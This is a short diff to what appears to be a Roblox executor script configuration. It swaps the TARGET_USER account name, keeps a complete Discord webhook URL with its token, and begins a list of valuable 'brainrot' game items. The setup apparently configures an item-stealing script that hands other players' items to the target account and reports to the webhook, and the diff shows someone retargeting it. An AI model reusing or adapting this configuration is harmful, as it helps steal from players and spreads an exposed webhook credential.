@@ -1,4 +1,4 @@
-getgenv().TARGET_USER = "TORREStdjs"
+getgenv().TARGET_USER = "dani50602"
 getgenv().WEBHOOK_URL = "https://discord.com/api/webhooks/1500574773737164821/ZXYcRXf3tgO8lxNKlkueFbcaWgcilNVfdwodIcOOrIPwAXNskQ-fiom5K77_F75l3Rm5"
 getgenv().NORMAL_BRAINROTS = {
 ["Garama and Madundung"] = true,
